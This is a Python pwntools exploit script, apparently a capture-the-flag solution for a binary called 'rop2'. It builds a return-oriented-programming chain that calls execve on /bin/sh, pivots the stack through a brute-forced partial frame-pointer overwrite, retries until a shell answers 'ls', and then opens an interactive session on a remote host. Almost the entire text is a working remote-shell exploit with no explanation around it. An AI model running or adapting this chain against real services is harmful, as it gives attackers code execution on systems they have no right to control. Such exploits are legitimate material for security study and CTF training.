#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0


c = 0
pwn_file = "./rop2"
elf = ELF(pwn_file)
print('gusse rbp 1/16, if not working, try again')
if debug == 1:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 3123)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug == 1:
    gdbcmd = '''
    b *0x004009e4
    c
    '''

    #gdb.attach(c, gdbcmd)
    context.log_level ='debug'

context.log_level ='debug'

ret_gadget = p64(0x400a47) # RET 

while True:
    # execve generated by ROPgadget
    p = p64(0x0000000000401637) # pop rsi ; ret
    p += p64(0x00000000006ca080) # @ .data
    p += p64(0x0000000000478616) # pop rax ; pop rdx ; pop rbx ; ret
    p += b'/bin//sh'
    p += b'/bin//sh'
    p += b'/bin//sh'
    p += p64(0x00000000004740c1) # mov qword ptr [rsi], rax ; ret
    p += p64(0x0000000000401637) # pop rsi ; ret
    p += p64(0x00000000006ca088) # @ .data + 8
    p += p64(0x00000000004260ef) # xor rax, rax ; ret
    p += p64(0x00000000004740c1) # mov qword ptr [rsi], rax ; ret
    p += p64(0x0000000000478616) # pop rax ; pop rdx ; pop rbx ; ret
    p += p64(0x3b)
    p += b'/bin//sh'
    p += b'/bin//sh'
    p += p64(0x0000000000401516) # pop rdi ; ret
    p += p64(0x00000000006ca080) # @ .data
    p += p64(0x0000000000401637) # pop rsi ; ret
    p += p64(0x00000000006ca088) # @ .data + 8
    p += p64(0x00000000004428e6) # pop rdx ; ret
    p += p64(0x00000000006ca088) # @ .data + 8
    p += p64(0x00000000004003da) # syscall

    payload = flat(p, filler=ret_gadget, length=0x12c)

    c.send(payload)

    # read Again
    bss = 0x00000000006ca080
    rbp = bss - 0x500
    buf2 = 0x6ccd60 


    to_buf2 = p64(0x000000000040060b) # pop rsp ; ret
    to_buf2 += p64(buf2)

    p = flat(ret_gadget + to_buf2, length=0x20)  + p8(0x50)

    c.sendafter('size', p)

    # check
    try:
        for i in range(3):
            c.sendlineafter('\n', 'ls', timeout=1)
            if c.recvline(timeout=1) == '':
                continue
        break
    except EOFError as error:
        c.close()
        c = remote('140.110.112.77', 3123)

c.interactive()
c.close()

